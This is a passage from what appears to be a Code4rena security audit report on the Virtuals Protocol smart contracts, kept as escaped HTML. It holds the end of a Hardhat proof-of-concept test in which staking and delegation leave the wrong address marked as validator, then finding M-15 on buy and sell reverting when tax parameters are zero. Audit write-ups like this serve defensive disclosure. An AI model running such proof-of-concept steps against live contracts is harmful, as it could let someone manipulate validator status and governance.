amountToBuy,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        capital,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        [virtualToken.target, agent.token],\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        trader.address,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        Math.floor(new Date().getTime() / 1000 + 600000)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    ////\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Start providing liquidity\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const lpToken = await ethers.getContractAt(\u0026quot;ERC20\u0026quot;, agent.lp);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const veToken = await ethers.getContractAt(\u0026quot;AgentVeToken\u0026quot;, agent.veToken);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await veToken.connect(founder).setCanStake(true);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(await lpToken.balanceOf(trader.address)).to.be.equal(0n);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentToken\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .connect(trader)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .approve(process.env.UNISWAP_ROUTER, parseEther(\u0026quot;10000000\u0026quot;));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await virtualToken\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .connect(trader)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .approve(process.env.UNISWAP_ROUTER, parseEther(\u0026quot;10000000\u0026quot;));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await router\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .connect(trader)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .addLiquidity(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        agentToken.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        virtualToken.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await agentToken.balanceOf(trader.address),\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await virtualToken.balanceOf(trader.address),\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        0,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        0,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        trader.address,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        Math.floor(new Date().getTime() / 1000 + 6000)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    /////////////////\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Staking, and able to delegate to anyone\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await lpToken.connect(trader).approve(agent.veToken, parseEther(\u0026quot;100\u0026quot;));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await expect(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      veToken\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        .connect(trader)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        .stake(parseEther(\u0026quot;10\u0026quot;), trader.address, poorMan.address)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    ).to.be.not.reverted;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Delegate to someone else without adding to the addValidator\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await veToken.connect(trader).delegate(randomAddr);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Assert poorMan as a validator \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(await agentNft.isValidator(agent.virtualId , poorMan.address)).to.be.eq(true);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Assert RandomAddress as not a validator\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(await agentNft.isValidator(agent.virtualId , randomAddr.address)).to.be.eq(false);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  });\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e});\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/details\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-15-if-ffactorybuytax-and--or-ffactoryselltax-is-set-to-0-buy--sell-would-revert\" style=\"position:relative;\"\u003e\u003ca href=\"#m-15-if-ffactorybuytax-and--or-ffactoryselltax-is-set-to-0-buy--sell-would-revert\" aria-label=\"m 15 if ffactorybuytax and  or ffactoryselltax is set to 0 buy  sell would revert permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-55\"\u003e[M-15] If \u003ccode\u003eFFactory::buyTax\u003c/code\u003e and / or \u003ccode\u003eFFactory::sellTax\u003c/code\u003e is set to 0, buy / sell would revert\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-546\"\u003eYouCrossTheLineAlfie\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-727\"\u003eNHristov\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/tax/BondingTax.sol#L125\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/tax/BondingTax.sol#L125\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-9\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-9\" aria-label=\"finding description 9 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/fun/FFactory.sol#L74\"\u003e\u003ccode\u003eFFactory::setTaxParams\u003c/code\u003e\u003c/a\u003e can be called by the admin to change the \u003ccode\u003ebuyTax\u003c/code\u003e and \u003ccode\u003esellTax\u003c/code\u003e.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"88\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// FFactory.sol\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetTaxParams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewVault_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebuyTax_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esellTax_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyRole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eADMIN_ROLE\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewVault_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Zero addresses are not allowed.\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etaxVault\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewVault_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebuyTax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebuyTax_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esellTax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esellTax_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis is used inside the \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/fun/FRouter.sol#L131\"\u003e\u003ccode\u003eFRouter::buy\u003c/code\u003e\u003c/a\u003e and \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/fun/FRouter.sol#L95\"\u003e\u003ccode\u003eFRouter::sell\u003c/code\u003e\u003c/a\u003e to levy fees.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"89\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// FRouter.sol\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebuy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountIn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyRole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eEXECUTOR_ROLE\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003enonReentrant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// . . . Rest of the code . . .\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebuyTax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etxFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountIn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e100\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efeeTo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etaxVault\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountIn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etxFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeTransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeTransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efeeTo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etxFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);          \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Fee sent to taxManager\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetAmountsOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIFPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransferTo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIFPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eswap\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efeeTo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etaxManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) 